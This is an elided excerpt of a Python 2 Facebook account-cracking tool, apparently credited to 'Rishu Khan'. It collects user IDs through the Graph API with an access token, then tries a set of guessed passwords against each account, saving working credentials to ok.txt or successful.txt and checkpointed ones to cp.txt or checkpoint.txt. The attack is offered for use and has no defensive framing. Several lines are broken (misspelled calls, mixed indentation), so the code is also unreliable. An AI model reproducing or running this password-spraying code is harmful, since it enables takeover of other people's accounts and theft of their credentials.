#coding=utf-8
#!/usr/bin/python2
#source code by Rishu Khan
#codded by Rishu Khan
# do no try to decode it
'''

DECODE BY Rishu Khan
...
def user_info():
	...
	print("")
        ...
        os.system("clear")
	print banner
	print("\033[1;91mThis Tool Is temporarily lock").center(50)
	print('')
	print("\033[1;92mPut Api Key To Unlock This Tool").center(50)
	print('')
	api = raw_input("\033[1;92m[!] Put Api Key :\033[0;92m ")
...
def menu_login2():
	...
	if user_select =="2":
		...
		print("")
		print("\033[1;91mPlease Select A Valid Option")
		print("")
		time.sleep(3)
		menu_login()
...
def login_fb():
	...
	time.sleep(3)
        ...
        print("")
        print("\033[1;91mEmail Or Password Has Wrong").center(50)
	time.sleep(3)
        login_fb()
    else:
        print("")
        print("\033[1;91mLogin Has CheckPoint").center(50)
        print("")
        time.seelp(3)
	login_fb()
...
def menu():
    ...
    try:
        ...
        print banner
        print("")
        print("\033[1;91mlogged account has checkpoint").center(50)
	time.sleep(3)
...
def menu_select():
	...
	if select =="1":
		...
		os.system("clear")
	        print banner
	        print("")
	        raw_input("\033[1;92mPress Enter To Tool Logout")
	        time.sleep(3)
	        os.system("exit")
	else:
		print("")
...
def crack_select():
	...
	time.sleep(0.05)
	print("[!]\033[1;92m Cracking Start...")
	time.sleep(0.05)
	print("[!]\033[1;91m Plz wait clone account will be appear here\033[1;0m")
	time.sleep(0.05)
	print(50*"-")
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass1+"\033[0;91m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error"]:
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass2+"\033[0;91m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass3+"\033[0;91m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass4+"\033[0;91m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[RISHU-CP] \033[1;92m"+uid+" | "+pass5+"\033[0;91m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass6+"\033[0;91m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error"]:
															...
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass7+"\033[0;91m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error"]:
																	...
																	cps.append(uid+pass7)
															                ...
															                q = json.loads(data)
															                if "loc" in q:
																                print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass8+"\033[0;91m")
																                ok = open("ok.txt","a")
																                ok.write(uid+" | "+pass8+"\n")
																                ok.close()
																                ...
																                if "www.facebook.com" in q["error"]:
																	                print("\033[1;91m[RISHU-CP] "+uid+" | "+pass8)
																	                cp = open("cp.txt","a")
																	                cp.write(uid+" | "+pass8+"\n")
																	                cp.close()
																	                cps.append(uid+pass8)
															                                ...
															                                q = json.loads(data)
															                                if "loc" in q:
																                                print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass9+"\033[0;91m")
																                                ok = open("ok.txt","a")
																                                ok.write(uid+" | "+pass9+"\n")
																                                ok.close()
																                                ...
																                                if "www.facebook.com" in q["error"]:
																	                                print("\033[1;91m[RISHU-CP] "+uid+" | "+pass9)
																	                                cp = open("cp.txt","a")
																	                                cp.write(uid+" | "+pass9+"\n")
																	                                cp.close()
																	                                cps.append(uid+pass9)
															                                                ...
															                                                q = json.loads(data)
															                                                if "loc" in q:
																                                                print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass10+"\033[0;91m")
																                                                ok = open("ok.txt","a")
																                                                ok.write(uid+" | "+pass10+"\n")
																                                                ok.close()
																                                                ...
																                                                if "www.facebook.com" in q["error"]:
																	                                                print("\033[1;91m[RISHU-CP] "+uid+" | "+pass10)
																	                                                cp = open("cp.txt","a")
																	                                                cp.write(uid+" | "+pass10+"\n")
																	                                                cp.close()
	...
	raw_input("\033[1;94m[!] Press Eter To Back")
	crack()
...
def choose():
	...
	choice_select()
def choice_select():
	select = raw_input("[!] \033[1;94mChoose : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		...
		pass3 = raw_input("\033[1;91m[3] Enter Password :\033[1;92m ")
		pass4 = raw_input("\033[1;91m[4] Enter Password :\033[1;92m ")
		pass5 = raw_input("\033[1;91m[5] Enter Password :\033[1;92m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
		...
		time.sleep(3)
		choose()
	print("[!] \033[1;91mTotal User IDs :\033[1;92m "+str(len(id)))
	time.sleep(0.05)
	print("[!]\033[1;92m Cracking Start...")
	time.sleep(0.05)
	print("[!]\033[1;92m Plz wait clone account will be appear here\033[1;0m")
	time.sleep(0.05)
	print(50*"-")
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass1+"\033[0;92m")
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[RISHU-CP] "+uid+" | "+pass1+"\033[0;91m")
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass2+"\033[0;92m")
						ok = open("successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[RISHU-CP] "+uid+" | "+pass2+"\033[0;91m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass3+"\033[0;92m")
								ok = open("successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[RISHU-CP] "+uid+" | "+pass3+"\033[0;91m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass4+"\033[0;92m")
										ok = open("successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
										...
										if "www.facebook.com" in q["error"]:
											print(" \033[1;91m[RISHU-CP] "+uid+" | "+pass4+"\033[0;91m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
									                ...
									                q = json.loads(data)
									                if "loc" in q:
										                print("\033[1;92m[RISHU-OK] \033[1;92m"+uid+" | "+pass5+"\033[0;92m")
										                ok = open("successful.txt", "a")
										                ok.write(uid+" | "+pass5+"\n")
										                ok.close()
										                oks.append(uid+pass5)
										                ...
										                if "www.facebook.com" in q["error"]:
											                print(" \033[1;91m[RISHU-CP] "+uid+" | "+pass5+"\033[0;91m")
											                cp = open("checkpoint.txt","a")
											                cp.write(uid+" | "+pass5+"\n")
											                cp.close()
